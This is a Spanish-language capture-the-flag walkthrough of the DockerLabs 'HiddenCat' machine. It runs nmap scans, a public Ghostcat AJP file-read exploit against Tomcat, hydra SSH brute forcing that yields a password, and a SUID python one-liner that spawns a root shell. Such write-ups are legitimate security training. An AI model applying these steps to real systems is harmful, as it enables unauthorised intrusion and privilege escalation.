# Máquina HiddenCat

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
8009/tcp open  ajp13      syn-ack
8080/tcp open  http-proxy syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p22,8009,8080 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
```

Vemos la versión de Tomcat -> **9.0.30**

--------------
## Explotación

Si buscamos exploits para esa versión concreta de **Tomcat**, encontraremos una vulnerabilidad concreta en **github**:
Vulnerabilidad -> [Enlace github](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2020-1938)

Esta vulnerabilidad nos lleva hasta este exploit en python -> [Exploit](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)

```shell
python2.7 CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml 172.17.0.2
```

![Pasted image 20240511201812](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/3d8e4fd8-f4a3-4fe8-9bab-b860058de071)

Hemos conseguido ver el contenido del archivo **/WEB-INF/web.xml**.
Vemos que el admin o un usuario que se llama **Jerry**.
Aplicamos fuerza bruta con ese usuario al **ssh** y obtenemos sus credenciales:

```shell
hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
------------------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   login: jerry   password: chocolate
```

Estamos dentro !

------------------------------
## Escalada de privilegios

Si buscamos por archivos con permisos **SUID** en el sistema, encontramos por ejemplo **python** con el cual es fácil escalar privilegios:

```shell
find / -perm -4000 2>/dev/null
----------------------------
/usr/bin/perl
/usr/bin/perl5.28.1
/usr/bin/python3.7
/usr/bin/python3.7m
```

```shell
/usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```shell
whoami
--------------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema ! 
